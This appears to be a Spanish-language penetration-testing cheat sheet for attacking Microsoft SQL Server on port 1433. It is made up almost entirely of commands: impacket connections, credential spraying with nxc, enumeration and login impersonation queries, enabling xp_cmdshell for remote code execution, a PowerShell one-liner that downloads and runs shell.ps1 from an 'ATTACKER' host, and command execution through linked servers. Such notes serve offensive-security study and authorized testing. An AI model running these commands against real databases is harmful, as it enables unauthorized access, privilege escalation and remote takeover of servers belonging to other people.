---
tags: [ports, mssql, database]
status: done
---

# 1433 — MSSQL

---

## Conectar

```bash
impacket-mssqlclient dominio/usuario:contraseña@<IP> -windows-auth
impacket-mssqlclient 'dominio/usuario':'contraseña'@<IP> -dc-ip <DC_IP> -windows-auth

# Spray de credenciales
nxc mssql <IP> -u usuarios.txt -p contraseñas.txt --local-auth
```

---

## Enumeración

```sql
-- Mostrar todas las BBDDs
SELECT name FROM sys.databases;

-- Usar una BBDD
USE nombre_bbdd;

-- BBDD actual
SELECT DB_NAME();

-- Listar usuarios del servidor
SELECT name FROM master.sys.server_principals;

-- Ver si podemos impersonar usuarios
SELECT DISTINCT b.name FROM sys.server_permissions a
INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id
WHERE a.permission_name = 'IMPERSONATE';

-- Impersonar usuario
EXECUTE AS LOGIN = 'usuario_objetivo';

-- Listar tablas de una BBDD
SELECT * FROM nombre_bbdd.INFORMATION_SCHEMA.TABLES;

-- Extraer datos
SELECT * FROM nombre_tabla;
```

---

## RCE via xp_cmdshell

```sql
-- Verificar estado
EXEC sp_configure 'xp_cmdshell';

-- Habilitar (requiere sysadmin)
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Ejecutar comandos
EXEC xp_cmdshell 'whoami';
EXEC xp_cmdshell 'powershell -c "IEX(New-Object Net.WebClient).DownloadString(''http://ATTACKER/shell.ps1'')"';
```

---

## Linked Servers

```sql
-- Ver servidores enlazados
SELECT * FROM sys.servers;

-- Ejecutar en servidor enlazado
EXECUTE('EXEC xp_cmdshell ''whoami''') AT [SERVIDOR_ENLAZADO];
```

